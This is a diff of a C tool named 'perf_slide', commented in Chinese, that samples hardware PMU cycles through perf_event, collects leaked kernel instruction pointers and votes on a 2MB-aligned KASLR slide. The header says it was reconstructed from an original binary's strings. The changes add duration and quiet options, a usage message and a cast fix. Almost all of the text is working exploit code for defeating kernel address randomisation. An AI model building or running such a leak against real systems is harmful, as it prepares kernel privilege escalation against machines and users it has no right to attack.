@@ -1,16 +1,14 @@
 /*
  * perf_slide — 用硬件 PMU 采样泄漏的内核帧反推 KASLR 位移。
  *
- * 按原件字符串表重建（strings/perf_slide.orig.txt）。原件的行为从这组输出串
- * 就能还原：
- *   [perf] samples=%d kernel_frames=%d
- *   [perf] candidates=%d
- *   [perf] best votes=%d/%d slide=%#lx
+ * 按原件字符串表重建（CI Artifact 的 strings/perf_slide.orig.txt）。原件行为
+ * 从输出串就能还原：
+ *   [perf] samples=%d kernel_frames=%d / candidates=%d / best votes=%d/%d slide=%#lx
  *   [perf] no kernel frames leaked / no slide candidate / no usable hardware PMU errno=%d
  *   [perf] hardware cycles open failed errno=%d (%s) / mmap failed errno=%d
  *   slide=0x%llx / site=0x%llx
- * 另外带一组配置串：--period --stext --etext --timer（以及内核符号表版本标记
- * LINUX_2.6.39）。所以原件是可配参数的采样器，不是硬编码探针。
+ * 配置串：--period --stext --etext --timer --duration，以及内核符号表版本标记
+ * LINUX_2.6.39。
  *
  * 判定规则与 Java 侧 KernelSupport.isSlideValid 一致：slide 必须 2MB 对齐。
  */
@@ -30,7 +28,6 @@
 #define MAX_CANDIDATES 4096
 #define SAMPLE_LIMIT   200000
 
-/* 内核符号表版本标记：原件里就有这一条，用来校验 profile 是否配套。 */
 static const char *KERNEL_SYMBOL_VERSION = "LINUX_2.6.39";
 
 struct config {
@@ -38,6 +35,8 @@ struct config {
 	uint64_t stext;
 	uint64_t etext;
 	uint64_t timer;
+	uint64_t duration_ms;
+	int quiet;
 };
 
 struct candidate {
@@ -71,7 +70,14 @@ static int is_kernel_address(uint64_t ip)
 /* 与 KernelSupport.isSlideValid 同一条规则：2MB 对齐且落在内核区间。 */
 static int is_valid_slide(uint64_t slide)
 {
-	return (slide & 0x1FFFFFULL) == 0 && ((slide + (-272730423296LL)) >> 48) == 0xFFFF;
+	return (slide & 0x1FFFFFULL) == 0
+		&& ((slide + (uint64_t)(-272730423296LL)) >> 48) == 0xFFFF;
+}
+
+static void usage(const char *argv0)
+{
+	printf("usage: %s [--period n] [--stext 0x..] [--etext 0x..] [--timer 0x..] "
+	       "[--duration ms]\n", argv0);
 }
 
 static void parse_args(int argc, char **argv, struct config *cfg)
@@ -86,7 +92,13 @@ static void parse_args(int argc, char **argv, struct config *cfg)
 			cfg->etext = strtoull(argv[++i], NULL, 0);
 		else if (!strcmp(arg, "--timer") && i + 1 < argc)
 			cfg->timer = strtoull(argv[++i], NULL, 0);
+		else if (!strcmp(arg, "--duration") && i + 1 < argc)
+			cfg->duration_ms = strtoull(argv[++i], NULL, 0);
+		else if (!strcmp(arg, "--quiet"))
+			cfg->quiet = 1;
 	}
+	if (cfg->duration_ms == 0)
+		cfg->duration_ms = 300;
 }
 
 int main(int argc, char **argv)
@@ -96,12 +108,14 @@ int main(int argc, char **argv)
 		.stext = 0,
 		.etext = 0,
 		.timer = 0,
+		.duration_ms = 0,
+		.quiet = 0,
 	};
 	parse_args(argc, argv, &cfg);
 
 	if (!cfg.stext || !cfg.etext) {
-		printf("提示：内核符号表版本标记 %s；未通过 --stext/--etext 指定采样窗口，"
-		       "只统计内核帧。\n", KERNEL_SYMBOL_VERSION);
+		printf("提示：采样窗口未指定（--stext/--etext），只统计内核帧；"
+		       "符号表版本标记 %s。\n", KERNEL_SYMBOL_VERSION);
 	}
 
 	struct perf_event_attr attr;
@@ -134,7 +148,7 @@ int main(int argc, char **argv)
 
 	ioctl(fd, PERF_EVENT_IOC_RESET, 0);
 	ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-	usleep(300 * 1000);
+	usleep((useconds_t)(cfg.duration_ms * 1000));
 	ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
 
 	struct perf_event_mmap_page *meta = (struct perf_event_mmap_page *)ring;
@@ -152,9 +166,9 @@ int main(int argc, char **argv)
 		struct perf_event_header *header =
 			(struct perf_event_header *)(data + (tail % data_size));
 
-		if (header->size < sizeof(*header) || tail + header->size > head) {
+		if (header->size < sizeof(*header) || tail + header->size > head)
 			break;
-		}
+
 		if (header->type == PERF_RECORD_SAMPLE) {
 			uint64_t ip;
 			memcpy(&ip, data + (tail % data_size) + sizeof(*header), sizeof(ip));
